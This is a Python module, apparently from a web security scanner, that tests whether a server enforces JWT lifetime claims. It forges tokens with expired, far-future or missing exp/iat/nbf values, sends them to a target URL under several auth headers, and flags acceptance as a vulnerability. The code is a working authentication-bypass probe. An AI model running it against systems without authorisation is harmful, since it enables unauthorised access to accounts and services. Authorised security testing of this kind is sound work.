"""JWT expiration bypass attack."""

import logging
import time
from typing import Any

from ._helpers import (
    JWT_AUTH_HEADERS,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def test_expiration_bypass(token: str, url: str, session) -> dict:
    """Test exp/iat/nbf lifetime manipulation.

    Creates tokens with expired, far-future, and missing lifetime claims
    to test if the server validates token expiration properly.
    """
    result: dict[str, Any] = {"attack": "expiration_bypass", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        if not isinstance(header, dict):
            header = {"alg": "HS256", "typ": "JWT"}
        header["alg"] = "HS256"

        original_status = _get_original_status(url, session)

        lifetime_tests = [
            {
                "name": "expired_token",
                "payload": {
                    **dict(payload),
                    "exp": 1000000000,
                    "iat": 1000000000,
                    "nbf": 1000000000,
                },
            },
            {
                "name": "far_future_expiry",
                "payload": {
                    **dict(payload),
                    "exp": 9999999999,
                    "iat": int(time.time()),
                },
            },
            {
                "name": "missing_exp",
                "payload": {
                    **{k: v for k, v in dict(payload).items() if k not in ("exp", "iat", "nbf")},
                },
            },
        ]

        for test in lifetime_tests:
            test_token = _create_jwt(header, test["payload"])

            for auth_header in JWT_AUTH_HEADERS:
                resp = _send_with_token(url, test_token, auth_header, session)
                status = resp.get("status", 0)

                if status in (200, 302) and original_status in (401, 403):
                    result["vulnerable"] = True
                    result["details"].append(
                        {
                            "test_name": test["name"],
                            "auth_header": auth_header,
                            "status_code": status,
                            "original_status": original_status,
                            "finding": f"lifetime_{test['name']}_bypass",
                        }
                    )
                    break

                if status == 200 and test["name"] == "expired_token":
                    body = resp.get("body", "").lower()
                    if "error" not in body and "expired" not in body:
                        result["vulnerable"] = True
                        result["details"].append(
                            {
                                "test_name": test["name"],
                                "auth_header": auth_header,
                                "status_code": status,
                                "finding": f"lifetime_{test['name']}_accepted",
                            }
                        )
                        break

            if result["vulnerable"] and test["name"] == "expired_token":
                break

        logger.info("Expiration bypass test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("Expiration bypass test error on %s: %s", url, e)
    return result
